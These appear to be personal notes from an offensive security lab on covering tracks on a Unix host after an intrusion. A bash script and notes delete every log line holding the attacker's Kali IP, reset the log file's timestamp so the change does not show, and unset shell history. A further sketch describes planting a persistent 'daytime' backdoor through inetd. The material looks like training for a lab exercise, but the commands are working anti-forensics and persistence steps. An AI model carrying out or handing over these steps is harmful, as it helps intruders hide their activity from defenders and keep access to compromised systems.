# Ultimately the goal would be to script the process.
```
To find which log.conf:
find /etc -name *syslog.conf

To find if auth logs will generate and where:
grep '*.info\|auth.info' <log.conf file>
grep '*.info\|auth.info' <log.conf file> | awk '/messages/ {print $2}'

Get kali IP:
ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

To clean logs and timestamp:
grep -v <kali ip> <log file> /tmp/messages; mv /tmp/messages <log file>
tail -1 <log file> | awk '{print $1 , $2, $3}'
touch --help | grep "STAMP"
touch -t CCYYMMDDhhmm.ss <log file>
```
example bash script
```
#!/bin/bash
# Main Functions
function findSyslog() {
	find /etc -name *syslog*.conf 2>/dev/null
}
function grepSyslog() {
	grep '*.info\|auth.info' $syslog
}
# syslog
function grepForlog() {
	messages=$(grep '*.info\|auth.info' $syslog | awk '/messages/ {print $2}')
}
# messages
function ipaddr() {
	ip -4 a
}
function cleanLogs() {
	grep -v $ipaddress $messages > /tmp/messages; mv /tmp/messages $messages
}
# ipaddress
function timeStamp() {
	touch -t $time $messages
}
# time
printf "\nLets try this out. \n\n"
findSyslog
printf "\n"
read -p "What is the syslog you would like to check? " syslog
printf "\n"
grepSyslog
grepForlog
printf "\nLog file is at: ${messages} \n"
read -p "What is the IP address of your kali machine?: " ipaddress
cleanLogs
printf "\nIf the result is 0 you have cleaned logs: "
grep -c $ipaddress ${messages}
printf "\nLast 5 line in the ${messages} \n"
tail -5 ${messages}
printf "\ncurrent date of machine: "
date

<< 'COMM'

To find which log.conf:
find /etc -name *syslog.conf

To find if auth logs will generate and where:
grep '*.info\|auth.info' <log.conf file>
grep '*.info\|auth.info' <log.conf file> | awk '/messages/ {print $2}'

Get kali IP:
ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

To clean logs:
grep -v <kali ip> <log file> /tmp/messages; mv /tmp/messages <log file>

Fix timestamp:
tail -1 <log file> | awk '{print $1 , $2, $3}'
touch --help | grep "STAMP"
touch -t CCYYMMDDhhmm.ss <log file>

COMM
```
## more to think about
```
daytime backdoor
create a script/service
touch the script/service
chmod +x scipt/service
edit a conf file or make a service
pkill -HUP inetd/or start the service
telnet localhost sleep exit funtion thing.
```
## quick check script
```
tty; bash; unset HISTSIZE; grep -c <kali IP> /var/adm/messages; tail -1 /var/adm/messages; ls -l /var/adm/messages; date; history; telnet localhost 13
```
